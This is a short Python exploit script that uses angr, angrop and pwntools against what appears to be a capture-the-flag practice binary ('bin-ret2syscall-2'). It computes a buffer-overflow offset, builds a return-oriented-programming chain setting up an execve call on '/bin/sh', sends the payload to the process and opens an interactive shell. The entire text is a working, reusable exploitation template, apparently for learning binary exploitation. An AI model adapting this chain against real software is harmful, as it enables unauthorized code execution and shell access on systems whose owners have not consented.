import angr, angrop
from pwn import *
from fart import get2overflow
binary = 'bins3/bin-ret2syscall-2'

b = get2overflow(binary)
buf = b'A'*b.buf()


p = angr.Project(binary)
r = p.analyses.ROP()
r.find_gadgets()


chain = r.set_regs(rax=59, rdi=b'/bin/sh\x00')

chain.print_payload_code()

print(buf + chain.payload_str())

io = process(binary)

io.sendline(buf + chain.payload_str())
io.interactive()

